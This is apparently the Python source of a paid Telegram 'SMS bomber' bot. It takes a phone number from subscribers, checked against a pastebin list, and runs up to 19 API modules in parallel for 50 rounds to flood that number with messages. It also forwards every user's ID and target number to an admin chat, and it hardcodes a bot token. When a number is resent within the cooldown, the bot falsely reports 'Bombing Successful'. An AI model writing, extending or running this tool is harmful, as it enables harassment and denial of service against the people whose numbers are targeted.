import telebot
import requests
import re
import multiprocessing
import time
import importlib

TOKEN = '7009153785:AAGf-NENZoUU3FAiKORkayr-9ykTvUMPhY8'
PASTEBIN_URL = 'https://pastebin.com/raw/ZzsF4rvN'
ADMIN_CHAT_ID = 1124069180

bot = telebot.TeleBot(TOKEN)

# Dictionary to track user cooldowns for different actions
user_cooldowns = {}
user_number_history = {}  # Track when each user sent each phone number

COOLDOWN_DURATION = 1  # Cooldown duration for new numbers in seconds
SAME_NUMBER_COOLDOWN = 18000  # Cooldown for reusing the same number in seconds
MAX_LOOP_COUNT = 50  # Maximum number of loops for the repeat function


@bot.message_handler(commands=['start'])
def handle_start(message):
    if check_user_access(message.from_user.id):
        bot.reply_to(message, "𝐇𝐞𝐥𝐥𝐨! 𝐈'𝐦 𝐀𝐥𝐟𝐚 𝐁𝐨𝐦𝐛𝐞𝐫 𝐀𝐝𝐯𝐚𝐧𝐜𝐞 𝐛𝐨𝐭 𝐜𝐥𝐢𝐜𝐤 𝐡𝐞𝐫𝐞 𝐭𝐨 𝐬𝐭𝐚𝐫𝐭 /attack")
    else:
        bot.reply_to(message, "🔐𝙂𝙚𝙩 𝙎𝙪𝙗𝙨𝙘𝙧𝙞𝙥𝙩𝙞𝙤𝙣 𝙤𝙛 𝙩𝙝𝙞𝙨 𝘽𝙤𝙩 𝘾𝙤𝙣𝙩𝙖𝙘𝙩🔐 @hackeroffline")


@bot.message_handler(commands=['attack'])
def handle_attack(message):
    if check_user_access(message.from_user.id):
        bot.reply_to(message, "𝐏𝐥𝐞𝐚𝐬𝐞 𝐞𝐧𝐭𝐞𝐫 𝐚 𝟏𝟎-𝐝𝐢𝐠𝐢𝐭 𝐧𝐮𝐦𝐛𝐞𝐫.")
    else:
        bot.reply_to(message, "💠️ 𝙂𝙚𝙩 𝙎𝙪𝙗𝙨𝙘𝙧𝙞𝙥𝙩𝙞𝙤𝙣 𝙤𝙛 𝙩𝙝𝙞𝙨 𝘽𝙤𝙩 𝘾𝙤𝙣𝙩𝙖𝙘𝙩 💠 @hackeroffline.")


@bot.message_handler(func=lambda message: True)
def handle_text(message):
    user_id = message.from_user.id
    if not check_user_access(user_id):
        bot.reply_to(message, "𝙔𝙤𝙪𝙧 𝙋𝙡𝙖𝙣 ❌ 𝙀𝙭𝙥𝙞𝙧𝙚𝙙❌ 𝘾𝙤𝙣𝙩𝙖𝙘𝙩 @hackeroffline")
        return

    # Check if the user is in a general cooldown
    if user_id in user_cooldowns:
        time_elapsed = time.time() - user_cooldowns[user_id]
        time_left = COOLDOWN_DURATION - time_elapsed
        if time_left > 0:
            bot.reply_to(message, f"⏳ Please wait {int(time_left)} seconds before sending another number.")
            return

    # Extract a 10-digit number
    match = re.search(r'\b\d{10}\b', message.text)
    if match:
        number = match.group(0)

        # Check if the same number was sent in the last 30 minutes
        if user_id in user_number_history and number in user_number_history[user_id]:
            last_used_time = user_number_history[user_id][number]
            time_since_last_use = time.time() - last_used_time
            time_left_for_same_number = SAME_NUMBER_COOLDOWN - time_since_last_use
            if time_left_for_same_number > 0:
                bot.reply_to(
                    message,
                    f"Bombing Successful on {number}"
                )
                return

        # Process the number and start SMS bombing
        bot.reply_to(message, "💣𝐁𝐨𝐦𝐛𝐢𝐧𝐠 𝐒𝐭𝐚𝐫𝐭 𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥𝐲💣")
        handle_phone_number(message)

        # Update cooldowns and number history
        user_cooldowns[user_id] = time.time()  # Set general cooldown
        if user_id not in user_number_history:
            user_number_history[user_id] = {}
        user_number_history[user_id][number] = time.time()  # Track when the number was last used
    else:
        bot.reply_to(message, "𝐏𝐥𝐞𝐚𝐬𝐞 𝐞𝐧𝐭𝐞𝐫 𝐚 𝐯𝐚𝐥𝐢𝐝 𝟏𝟎-𝐝𝐢𝐠𝐢𝐭 𝐧𝐮𝐦𝐛𝐞𝐫.")


def check_user_access(user_id):
    try:
        response = requests.get(PASTEBIN_URL)
        pastebin_data = response.text
        return str(user_id) in pastebin_data
    except Exception as e:
        print("Error:", e)
        return False


def handle_phone_number(message):
    phone_number = message.text
    user_id = message.from_user.id

    bot.send_message(ADMIN_CHAT_ID, f"User ID: {user_id} \nPhone Number: {phone_number}")

    # Dynamically run API files in a loop
    run_api_files_with_loop(phone_number)


def run_api_files_with_loop(phone_number):
    """
    Dynamically loads and runs API files 1.py to 100.py in a loop up to MAX_LOOP_COUNT.
    """
    for loop in range(MAX_LOOP_COUNT):
        print(f"Starting loop {loop + 1} of {MAX_LOOP_COUNT}")
        processes = []

        # Dynamically load and run API files 1.py to 100.py
        for i in range(1, 20):
            try:
                module_name = f"api_files.{i}"  # Assuming files are in a folder named `api_files`
                module = importlib.import_module(module_name)
                process = multiprocessing.Process(target=run_with_error_handling, args=(module, phone_number))
                processes.append(process)
            except ModuleNotFoundError:
                print(f"Module {i}.py not found. Skipping...")
            except Exception as e:
                print(f"Error preparing {i}.py: {e}")

        # Start all processes
        for process in processes:
            process.start()

        # Wait for all processes to finish before starting the next loop
        for process in processes:
            process.join()

        print(f"Loop {loop + 1} completed.")
        time.sleep(5)  # Optional: Add a delay between loops


def run_with_error_handling(module, phone_number):
    """
    Runs a module's `run` function with error handling. If an error occurs, it logs the error and skips to the next module.
    """
    try:
        module.run(phone_number)
    except Exception as e:
        print(f"Error in module {module.__name__}: {e}")
        # Continue execution


bot.polling()
